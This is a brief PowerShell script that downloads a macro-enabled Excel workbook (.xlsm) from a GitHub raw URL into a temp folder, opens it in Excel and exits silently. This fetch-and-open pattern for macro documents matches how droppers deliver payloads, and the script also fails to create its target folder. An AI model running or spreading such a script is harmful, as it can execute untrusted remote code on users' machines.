<#
.SYNOPSIS
    Downloads and opens an Excel (.xlsm) file in %TEMP%\MyExcelTemp.
.DESCRIPTION
    This script downloads a specified .xlsm file and opens it using Excel.
.NOTES
    Requires PowerShell 3.0 or later.
#>

# Use the temp folder path
$folderPath = "$env:TEMP\MyExcelTemp"

# Define the URL of the .xlsm file
$xlsmFileURL = "https://github.com/seunoshino/myapp-downloads/raw/refs/heads/main/imarc.xlsm"  # Replace with your actual URL
$xlsmFilePath = "$folderPath\imarc.xlsm"

# Function to download the .xlsm file
function Download-File {
    param (
        [string]$url,
        [string]$filePath
    )

    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $filePath)
}

# Download the .xlsm file
Download-File -url $xlsmFileURL -filePath $xlsmFilePath

# Check if the file was downloaded successfully
if (Test-Path $xlsmFilePath) {
    # Open the .xlsm file using Excel
    Start-Process "excel.exe" -ArgumentList "`"$xlsmFilePath`""
} else {
    Write-Host "Failed to download the .xlsm file."
}

# Exit silently
exit